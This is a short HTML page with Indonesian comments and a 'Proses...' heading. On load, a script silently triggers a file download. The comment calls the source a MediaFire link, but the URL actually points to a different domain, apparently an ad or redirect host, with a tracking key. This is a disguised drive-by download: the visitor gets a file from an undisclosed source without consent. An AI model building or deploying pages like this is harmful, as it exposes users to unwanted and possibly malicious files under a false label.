<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

</head>
<body>

<h1>Proses...</h1>

<script>
    // Gantilah URL ini dengan link MediaFire yang sesuai
    const mediaFireLink = "https://shorterwanderer.com/hdhuuccx5j?key=5f3dd5368ab0cd1c489d4ab8ea461219";

    // Fungsi untuk memulai pengunduhan otomatis
    function downloadFile(url) {
        const a = document.createElement('a');
        a.href = url;
        a.download = '';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    }

    // Eksekusi pengunduhan setelah halaman dimuat
    window.onload = function() {
        downloadFile(mediaFireLink);
    };
</script>

</body>
</html>
